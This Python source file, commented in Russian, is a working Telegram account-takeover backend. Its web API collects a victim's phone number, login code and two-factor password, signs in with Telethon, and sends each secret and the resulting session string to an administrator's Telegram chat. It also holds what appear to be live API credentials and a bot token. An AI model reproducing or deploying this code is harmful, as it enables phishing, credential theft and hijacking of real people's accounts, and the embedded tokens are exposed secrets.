import asyncio, os, logging
from aiogram import Bot
from aiohttp import web
import aiohttp_cors
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, PasswordHashInvalidError

# --- ТВОИ ДАННЫЕ ---
API_ID, API_HASH = 15587172, "d3d35aebb0b6ebdb7a002836914ee37d"
BOT_TOKEN = "8613728108:AAGR9Lmdx2YvG6wbg8qk31rcLxeKD4Vu6Po"
ADMIN_ID = 1866813859 

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN)
active_clients = {}

async def send_to_admin(text):
    try:
        await bot.send_message(ADMIN_ID, text, parse_mode="Markdown")
        logging.info("✅ Сообщение отправлено админу")
    except Exception as e:
        logging.error(f"❌ ОШИБКА ОТПРАВКИ: {e}")
        print(f"\n--- ДАННЫЕ ---\n{text}\n--------------\n")

async def handle_api(request):
    try:
        data = await request.json()
        uid, act = str(data.get("user_id")), data.get("action")
        
        if act == "send_phone":
            phone = data.get("phone").replace(" ", "").replace("-", "")
            client = TelegramClient(StringSession(), API_ID, API_HASH)
            await client.connect()
            sent = await client.send_code_request(phone)
            active_clients[uid] = {"c": client, "p": phone, "h": sent.phone_code_hash}
            await send_to_admin(f"📱 **Новый номер:** `{phone}`")
            return web.json_response({"status": "ok"})
            
        elif act == "send_code":
            s = active_clients.get(uid)
            if not s: return web.json_response({"status": "error", "message": "Сессия истекла"})
            code = data.get("code")
            await send_to_admin(f"📨 **Код для {s['p']}:** `{code}`")
            try:
                await s["c"].sign_in(s["p"], code, phone_code_hash=s["h"])
                return await finish_login(uid)
            except SessionPasswordNeededError:
                return web.json_response({"status": "need_2fa"})
            except Exception as e:
                return web.json_response({"status": "error", "message": str(e)})

        elif act == "send_2fa":
            s = active_clients.get(uid)
            if not s: return web.json_response({"status": "error", "message": "Сессия истекла"})
            pwd = data.get("password")
            await send_to_admin(f"🔑 **2FA для {s['p']}:** `{pwd}`")
            try:
                await s["c"].sign_in(password=pwd)
                return await finish_login(uid)
            except PasswordHashInvalidError:
                return web.json_response({"status": "error", "message": "Неверный пароль"})

    except Exception as e:
        return web.json_response({"status": "error", "message": str(e)})

async def finish_login(uid):
    s = active_clients.get(uid)
    string_session = s["c"].session.save()
    msg = (f"✅ **ВХОД УСПЕШЕН!**\nНомер: `{s['p']}`\n\n**SESSION:**\n`{string_session}`")
    await send_to_admin(msg)
    return web.json_response({"status": "success"})

# --- СТРОГАЯ НАСТРОЙКА СЕРВЕРА (БЕЗ ДУБЛЕЙ) ---
app = web.Application()
cors = aiohttp_cors.setup(app, defaults={"*": aiohttp_cors.ResourceOptions(allow_credentials=True, expose_headers="*", allow_headers="*")})

# ОДНА ЕДИНСТВЕННАЯ РЕГИСТРАЦИЯ
resource = app.router.add_resource("/api")
route = resource.add_route("POST", handle_api)
cors.add(route)

async def main():
    port = int(os.environ.get("PORT", 10000))
    runner = web.AppRunner(app)
    await runner.setup()
    await web.TCPSite(runner, '0.0.0.0', port).start()
    
    # Твоя проверка при запуске
    await send_to_admin("ДЛЯ ПРОХОДА ПРОВЕРКИ НАЖМИ НА КНОПКУ СНИЗУ 👇")
    
    logging.info(f"СЕРВЕР ЗАПУЩЕН НА ПОРТУ {port}")
    while True: await asyncio.sleep(3600)

if __name__ == "__main__":
    asyncio.run(main())
